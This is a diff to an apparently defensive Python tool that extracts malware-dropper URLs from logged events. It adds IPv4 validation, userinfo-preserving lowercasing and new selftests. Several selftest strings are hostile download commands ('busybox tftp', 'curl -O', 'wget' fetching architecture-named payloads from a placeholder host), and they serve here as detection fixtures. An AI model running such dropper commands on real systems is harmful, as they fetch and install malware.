@@ -92,12 +92,20 @@ def authority_end(url, start):
 
 
 def lower_scheme_host(raw):
+    """Lowercase the scheme and the host, not the userinfo: `User:PaSS@` in
+    an authority stays exactly as the attacker wrote it."""
     sep = raw.find("://")
     if sep == -1:
         return raw
     start = sep + 3
     end = authority_end(raw, start)
-    return raw[:start].lower() + raw[start:end].lower() + raw[end:]
+    authority = raw[start:end]
+    at = authority.rfind("@")
+    if at == -1:
+        authority = authority.lower()
+    else:
+        authority = authority[:at + 1] + authority[at + 1:].lower()
+    return raw[:start].lower() + authority + raw[end:]
 
 
 def host_dropped(host):
@@ -142,6 +150,10 @@ def parse_devtcp_match(m):
 
 def parse_bare_match(m):
     host, port_s, path = m.group(1), m.group(2), m.group(3) or ""
+    try:
+        ipaddress.IPv4Address(host)
+    except ValueError:
+        return None  # kind bare's host is an IPv4 address by definition
     url = host + (":" + port_s if port_s else "") + path
     if host_dropped(host) or len(url) > MAX_URL:
         return None
@@ -267,6 +279,11 @@ def scan(client):
     """Stamp events with what they named, record the locations. Returns the
     number of events successfully stamped."""
     ensure_book(client)
+    # ponytail: always the BATCH oldest unstamped events. If their _update
+    # keeps failing (index gone read-only inside LOOKBACK), the same ones
+    # come back every pass and newer events wait behind them. Upgrade path:
+    # search_after past the failures, or remember failures in memory for
+    # the process lifetime.
     body = {
         "size": BATCH,
         "sort": [{"@timestamp": "asc"}],
@@ -364,6 +381,12 @@ def selftest():
     items = extract("busybox tftp -g -r mips 8.8.4.4; curl -O 8.8.4.4:8080/arm")
     assert len(items) == 2 and all(i["kind"] == "bare" for i in items), items
 
+    # 5b (kind bare's host is an IPv4 address, not any dotted digit string)
+    assert extract("wget 999.1.1.1/a") == []
+    assert extract("curl 010.1.1.1/x") == []
+    items = extract("tftp -g -r m 8.8.4.4")
+    assert len(items) == 1 and items[0]["kind"] == "bare", items
+
     # 6 (proxy-probe request line: the verb's own target is not a dropper)
     assert extract("GET http://judge.example/azenv.php HTTP/1.1") == []
 
@@ -375,6 +398,11 @@ def selftest():
     # 8 (percent- and +-encoded, one unquote_plus pass decodes it)
     items = extract("%77get%20http%3A%2F%2F8.8.4.4%2Fz")
     assert [i["url"] for i in items] == ["http://8.8.4.4/z"], items
+
+    # 8b (scheme and host are lowercased, userinfo is kept as written)
+    items = extract("wget http://User:PaSS@8.8.4.4/A.sh")
+    assert items[0]["url"] == "http://User:PaSS@8.8.4.4/A.sh", items
+    assert items[0]["host"] == "8.8.4.4", items
 
     # 9
     thirty = " ".join(f"http://8.8.4.4/p{n}" for n in range(30))
@@ -425,7 +453,7 @@ def selftest():
     with open(__file__, encoding="utf-8") as fh:
         source = fh.read()
     needles = ["import" + " socket", "urllib" + ".request",
-               "import" + " subprocess", "http" + ".client"]
+               "sub" + "process", "http" + ".client"]
     assert not [n for n in needles if n in source], "forbidden import present"
 
     # 13: hostile input finishes fast and never raises
